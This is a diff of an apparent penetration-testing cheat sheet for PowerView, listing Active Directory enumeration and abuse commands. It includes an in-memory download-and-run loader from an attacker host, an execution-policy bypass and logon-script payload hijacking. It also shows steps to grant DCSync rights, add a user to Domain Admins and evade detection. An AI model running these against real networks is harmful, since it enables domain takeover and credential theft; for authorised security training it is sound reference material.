@@ -1,54 +1,88 @@
 ---
-title: "PowerShell / PowerView"
+title: "PowerView"
 ---
-PowerView is the go-to Windows-side enumeration and manipulation library for AD. Import it once and use it for everything from ACL reads to object modification. This page also covers PS Remoting and the credential object pattern used when operating as a different user without switching sessions.
+
+PowerView is the go-to PowerShell library for AD enumeration and object manipulation from Windows. Import it once and use it for everything from basic user enumeration to ACL abuse and targeted Kerberoasting.
 
 ## Setup
 
-Import PowerView and bypass execution policy restrictions. Always load from a writable path or memory if AV is active.
+<Tabs>
+  <Tab title="PowerSploit">
+    ```powershell wrap
+    # Download and extract PowerSploit
+    Invoke-WebRequest -Uri "https://github.com/PowerShellMafia/PowerSploit/archive/master.zip" -OutFile "PowerSploit.zip"
+    Expand-Archive -Path "PowerSploit.zip" -DestinationPath "C:\Tools\"
+
+    # Import PowerView from the extracted path
+    Import-Module C:\Tools\PowerSploit-master\Recon\PowerView.ps1
+    ```
+  </Tab>
+  <Tab title="Standalone">
+    ```powershell wrap
+    # Download standalone PowerView
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "PowerView.ps1"
+
+    # Import
+    Import-Module .\PowerView.ps1
+
+    # Or dot-source
+    . .\PowerView.ps1
+    ```
+  </Tab>
+  <Tab title="Dev Branch">
+    ```powershell wrap
+    # Dev branch has more features
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" -OutFile "PowerView-dev.ps1"
+    Import-Module .\PowerView-dev.ps1
+    ```
+  </Tab>
+  <Tab title="In-Memory">
+    ```powershell wrap
+    # Load directly from memory — avoids touching disk
+    IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/PowerView.ps1')
+    ```
+  </Tab>
+</Tabs>
 
 ```powershell wrap
-# Load from disk
-Import-Module .\PowerView.ps1
-
 # Bypass execution policy without changing system settings
 powershell -ep bypass
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
-# Load directly from memory (avoids touching disk)
-IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/PowerView.ps1')
+# List all PowerView functions
+Get-Command -Module PowerView
+Get-Command *-Domain*
+Get-Command *-Net*
 ```
 
 ## Credential Objects
 
-Use credential objects to run commands as a different user without switching your session. Essential when you have creds for a user but are not running as them.
+Run commands as a different user without switching your session. Required when you have creds for another account but are not running as them.
 
 ```powershell wrap
-# Build a credential object
 $pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER', $pass)
 
-# Use -Credential $cred on any PowerView or AD cmdlet
+# Pass $cred to any PowerView cmdlet
 Get-DomainUser -Credential $cred
-Get-DomainGroup -Credential $cred -Identity "Core Staff"
+Get-DomainGroup -Credential $cred -Identity "Domain Admins"
 ```
 
 ## PS Remoting
 
-PS Remoting gives you an interactive PowerShell session on a remote host over WinRM (port 5985/5986). Requires the account to be in Remote Management Users or be a local admin.
+Interactive PowerShell sessions over WinRM (port 5985/5986). Requires Remote Management Users membership or local admin.
 
 ```powershell wrap
 # Interactive session
 Enter-PSSession -ComputerName $TARGET -Credential $cred
 
-# Run a single command remotely without entering a session
+# Single remote command
 Invoke-Command -ComputerName $TARGET -Credential $cred -ScriptBlock { whoami }
-Invoke-Command -ComputerName $TARGET -Credential $cred -ScriptBlock { Get-Process }
 
-# Load a script on the remote host from your attacker machine
+# Load a script on the remote host
 Invoke-Command -ComputerName $TARGET -Credential $cred -FilePath .\PowerView.ps1
 
-# Create a persistent session object (reuse for multiple commands)
+# Persistent session (reuse for multiple commands)
 $session = New-PSSession -ComputerName $TARGET -Credential $cred
 Invoke-Command -Session $session -ScriptBlock { whoami }
 Enter-PSSession -Session $session
@@ -57,116 +91,305 @@ Enter-PSSession -Session $session
 Copy-Item -Path .\tool.exe -Destination C:\Windows\Temp\tool.exe -ToSession $session
 ```
 
-## Enumeration
-
-Core enumeration commands. These are the ones you run right after getting a foothold or credential.
+## Domain Information
 
 ```powershell wrap
-# Users
-Get-DomainUser                                                  # all domain users
-Get-DomainUser -Identity $TARGET                               # specific user
-Get-DomainUser -SPN                                            # Kerberoastable accounts
-Get-DomainUser -UACFilter DONT_REQ_PREAUTH                     # AS-REP roastable accounts
-Get-DomainUser -Properties samaccountname,description,memberof # targeted attributes
+Get-Domain                    # current domain info
+Get-DomainController          # all DCs
+Get-DomainPolicy              # password policy, Kerberos policy
+Get-DomainTrust               # all trust relationships
+Get-Forest                    # forest information
+```
 
-# Groups
-Get-DomainGroup                                                 # all groups
-Get-DomainGroup -Identity "Domain Admins"                      # specific group
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse       # recursive membership
+## Users
 
-# Computers
-Get-DomainComputer                                             # all computer accounts
-Get-DomainComputer -Unconstrained                             # unconstrained delegation
-Get-DomainComputer -TrustedToAuth                             # constrained delegation
+<AccordionGroup>
+  <Accordion title="Basic Enumeration">
+    ```powershell wrap
+    Get-DomainUser                                                   # all users
+    Get-DomainUser -Identity $USER                                   # specific user
+    Get-DomainUser -Properties samaccountname,description,pwdlastset # targeted attributes
+    Get-DomainUser -AdminCount                                       # privileged users
+    ```
+  </Accordion>
+  <Accordion title="Attack Targets">
+    ```powershell wrap
+    # Kerberoastable
+    Get-DomainUser -SPN
+    Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,pwdlastset,lastlogon
+    Get-DomainUser -SPN -AdminCount                                  # high-value targets
+    Get-DomainUser -SPN | Where-Object { $_.pwdlastset -lt (Get-Date).AddDays(-365) }
 
-# ACLs
-Get-DomainObjectAcl -Identity $TARGET -ResolveGUIDs           # ACL on a specific object
-Find-InterestingDomainAcl -ResolveGUIDs                       # sweep for interesting ACEs
+    # AS-REP roastable
+    Get-DomainUser -PreauthNotRequired
+    Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 
-# GPO
-Get-DomainGPO                                                  # all GPOs
-Get-DomainGPO -ComputerIdentity $TARGET                       # GPOs applied to a computer
+    # Password not required
+    Get-DomainUser -PasswordNotRequired
+    ```
+  </Accordion>
+</AccordionGroup>
 
-# OU
-Get-DomainOU                                                   # all OUs
+## Groups
+
+```powershell wrap
+Get-DomainGroup                                                      # all groups
+Get-DomainGroup -Identity "Domain Admins"                            # specific group
+Get-DomainGroupMember -Identity "Domain Admins"                      # members
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse             # recursive membership
+Get-DomainGroup -UserName $USER                                      # groups for a user
+
+# Local groups on remote machines
+Get-NetLocalGroup -ComputerName $TARGET
+Get-NetLocalGroupMember -ComputerName $TARGET -GroupName Administrators
+```
+
+## Computers
+
+<AccordionGroup>
+  <Accordion title="Basic Enumeration">
+    ```powershell wrap
+    Get-DomainComputer                                                           # all computers
+    Get-DomainComputer -OperatingSystem "*Server 2019*"                          # filter by OS
+    Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp
+    ```
+  </Accordion>
+  <Accordion title="Delegation">
+    ```powershell wrap
+    Get-DomainComputer -UnconstrainedDelegation                                  # unconstrained
+    Get-DomainComputer -TrustedToAuth                                            # constrained
+    Get-DomainUser -TrustedToAuth                                                # constrained (users)
+
+    # Resource-based constrained delegation
+    Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity" }
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Sessions & Logons
+
+```powershell wrap
+# Sessions (requires admin on remote)
+Get-NetSession
+Get-NetSession -ComputerName $TARGET
+
+# Logged-on users
+Get-NetLoggedon -ComputerName $TARGET
+Get-NetLoggedon -ComputerName $TARGET -LocalOnly
+
+# Sweep all domain computers
+Get-DomainComputer | ForEach-Object { Get-NetSession -ComputerName $_.dnshostname }
+```
+
+## Shares
+
+```powershell wrap
+Get-NetShare                           # local shares
+Get-NetShare -ComputerName $TARGET     # remote shares
+Find-DomainShare                       # all shares across domain
+Find-DomainShare -CheckShareAccess     # only readable shares
+
+# Sweep all computers
+Get-DomainComputer | ForEach-Object { Get-NetShare -ComputerName $_.dnshostname }
+```
+
+## SPNs
+
+```powershell wrap
+# All SPNs
+Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
+
+# Filter by service type
+Get-DomainUser -SPN | Where-Object { $_.serviceprincipalname -like "*SQL*" }
+Get-DomainUser -SPN | Where-Object { $_.serviceprincipalname -like "*HTTP*" }
+
+# Unique service types
+Get-DomainUser -SPN | ForEach-Object { $_.serviceprincipalname } | ForEach-Object { $_.split('/')[0] } | Sort-Object -Unique
+```
+
+## ACL Enumeration
+
+<AccordionGroup>
+  <Accordion title="Reading ACLs">
+    ```powershell wrap
+    Get-DomainObjectAcl -Identity "Domain Admins"
+    Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+    Get-DomainObjectAcl -Identity $USER -ResolveGUIDs
+    Find-InterestingDomainAcl
+    Find-InterestingDomainAcl -ResolveGUIDs
+    ```
+  </Accordion>
+  <Accordion title="Finding Exploitable Rights">
+    ```powershell wrap
+    # Objects modifiable by current user
+    Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -like "*$env:USERNAME*" }
+
+    # By right type
+    Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }
+    Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -like "*WriteDacl*" }
+    Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -like "*WriteOwner*" }
+
+    # By SID
+    Get-DomainObjectAcl | Where-Object { $_.SecurityIdentifier -eq "$SID" }
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Trusts
+
+```powershell wrap
+Get-DomainTrust                                                      # all trusts
+Get-ForestTrust                                                      # forest-level trusts
+Get-DomainTrustMapping                                               # full trust map
+Get-DomainTrust | Where-Object { $_.TrustDirection -eq "Bidirectional" }
+
+# Cross-domain enumeration
+Get-DomainUser -Domain $TRUSTED_DOMAIN
+Get-DomainGroup -Domain $TRUSTED_DOMAIN
+Get-DomainForeignGroupMember                                         # foreign members in local groups
+Get-DomainForeignUser                                                # local users in foreign groups
+```
+
+## Local Admin Access
+
+```powershell wrap
+Find-LocalAdminAccess                                                # machines where you have local admin
+Test-AdminAccess -ComputerName $TARGET
+Find-DomainLocalGroupMember -GroupName Administrators
+
+# Sweep all computers
+Get-DomainComputer | ForEach-Object { Test-AdminAccess -ComputerName $_.dnshostname }
+```
+
+## GPO & OU
+
+```powershell wrap
+# GPOs
+Get-DomainGPO
+Get-DomainGPO -ComputerIdentity $TARGET
+Get-DomainGPOLocalGroup
+Get-DomainGPOComputerLocalGroupMapping
+Get-DomainGPO | Where-Object { $_.displayname -like "*password*" }
+
+# OUs
+Get-DomainOU
+Get-DomainComputer -SearchBase "OU=Servers,DC=$DC,DC=com"
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }
+```
+
+## LDAP Filters
+
+```powershell wrap
+# Users with password not required (UAC flag 32)
+Get-DomainUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
+
+# Users with a description set
+Get-DomainUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(description=*))"
+
+# Computers running Server OS
+Get-DomainComputer -LDAPFilter "(&(objectCategory=computer)(operatingSystem=*Server*))"
+
+# Groups with "admin" in name
+Get-DomainGroup -LDAPFilter "(&(objectCategory=group)(name=*admin*))"
 ```
 
 ## ACL Manipulation
 
-Modify object permissions. Used when you have ownership or WriteDACL over an object and need to grant yourself additional rights.
+Modify object permissions. Requires ownership, WriteDACL, or GenericAll on the target.
 
 ```powershell wrap
-# Grant yourself (or another principal) GenericAll on a target object
+# Grant GenericAll
 Add-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
-
-# Grant rights using a specific credential object (common when operating as a different user)
 Add-DomainObjectAcl -Credential $cred -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
 
-# Grant WriteMember specifically (enough to add members to a group)
-Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity $USER -Rights WriteMembers
+# Grant WriteMember (enough to add to group)
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "Domain Admins" -PrincipalIdentity $USER -Rights WriteMembers
 
-# Grant DCSync rights on the domain object
+# Grant DCSync on the domain object
 Add-DomainObjectAcl -TargetIdentity "$DOMAIN" -PrincipalIdentity $USER -Rights DCSync
 
-# Remove ACL entry after use (clean up)
+# Clean up after use
 Remove-DomainObjectAcl -TargetIdentity $TARGET -PrincipalIdentity $USER -Rights All
 ```
 
 ## Group Manipulation
 
-Add or remove members from groups. Requires WriteMember or GenericWrite on the group object.
+Requires WriteMember or GenericWrite on the group.
 
 ```powershell wrap
-# Add a user to a group
-Add-DomainGroupMember -Identity "Core Staff" -Members $USER
-Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members $USER
+Add-DomainGroupMember -Identity "Domain Admins" -Members $USER
+Add-DomainGroupMember -Credential $cred -Identity "Domain Admins" -Members $USER
 
-# Remove a user from a group
-Remove-DomainGroupMember -Identity "Core Staff" -Members $USER
+Remove-DomainGroupMember -Identity "Domain Admins" -Members $USER
 
-# Verify membership
-Get-DomainGroupMember -Identity "Core Staff"
+Get-DomainGroupMember -Identity "Domain Admins"      # verify
 ```
 
 ## Object Property Modification
 
-Set arbitrary properties on AD objects. Requires GenericWrite or WriteProperty on the target.
+Requires GenericWrite or WriteProperty on the target.
 
 ```powershell wrap
-# Set an SPN on a user (Targeted Kerberoasting)
+# Set SPN (Targeted Kerberoasting)
 Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN"}
-
-# Clear an SPN (clean up after targeted Kerberoasting)
 Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
 
-# Set scriptPath (logon script abuse, runs on next logon)
+# Logon script abuse (runs on next logon)
 Set-DomainObject -Identity $TARGET -Set @{scriptpath="\\$LHOST\share\payload.bat"}
 
-# Disable pre-authentication (make account AS-REP roastable)
+# Disable pre-authentication (AS-REP roastable)
 Set-DomainObject -Identity $TARGET -XOR @{useraccountcontrol=4194304}
 ```
 
 ## Owner to Group Membership Flow
 
-A common BloodHound path: you own a group but are not a member of it, and do not have WriteMember rights. As the owner you control the DACL, so you can grant yourself WriteMember first, then add yourself.
+A common BloodHound path: you own a group but do not have WriteMember. As owner you control the DACL, so you grant yourself WriteMember first.
 
 | Right | What it means |
 |-------|---------------|
-| Owner | Controls the DACL, can grant or modify any permission on the object |
-| Member | Is listed inside the group and inherits the group's privileges |
+| Owner | Controls the DACL, can grant any permission on the object |
 | WriteMember / GenericWrite | Can add or remove members from the group |
+| Member | Is listed inside the group and inherits its privileges |
+
+<Steps>
+  <Step title="Build a credential object for the owning account">
+    ```powershell wrap
+    $pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
+    $cred = New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER', $pass)
+    ```
+  </Step>
+  <Step title="Grant yourself WriteMember on the group">
+    ```powershell wrap
+    Add-DomainObjectAcl -Credential $cred -TargetIdentity "Domain Admins" -PrincipalIdentity "$DOMAIN\$USER" -Rights WriteMembers
+    ```
+  </Step>
+  <Step title="Add yourself as a member">
+    ```powershell wrap
+    Add-DomainGroupMember -Credential $cred -Identity "Domain Admins" -Members "$DOMAIN\$USER"
+    ```
+  </Step>
+  <Step title="Verify">
+    ```powershell wrap
+    Get-DomainGroupMember -Identity "Domain Admins"
+    ```
+  </Step>
+</Steps>
+
+## Operational Tips
 
 ```powershell wrap
-# Step 1: Build a credential object for the account that owns the group
-$pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential('$DOMAIN\$USER', $pass)
+# Use alternate credentials for all queries
+$cred = Get-Credential
+Get-DomainUser -Credential $cred
 
-# Step 2: Grant yourself WriteMember rights on the group (you can do this because you own it)
-Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "$DOMAIN\$USER" -Rights WriteMembers
+# Target a specific DC (useful across trusts or with multiple DCs)
+Get-DomainUser -Server $DC_IP
 
-# Step 3: Add yourself as a member
-Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "$DOMAIN\$USER"
+# Reduce query size to avoid detection / timeouts
+Get-DomainUser -ResultPageSize 100
 
-# Step 4: Verify
-Get-DomainGroupMember -Identity "Core Staff"
+# Verbose output for debugging
+$VerbosePreference = "Continue"
+Get-DomainUser -Identity $USER -Verbose
 ```
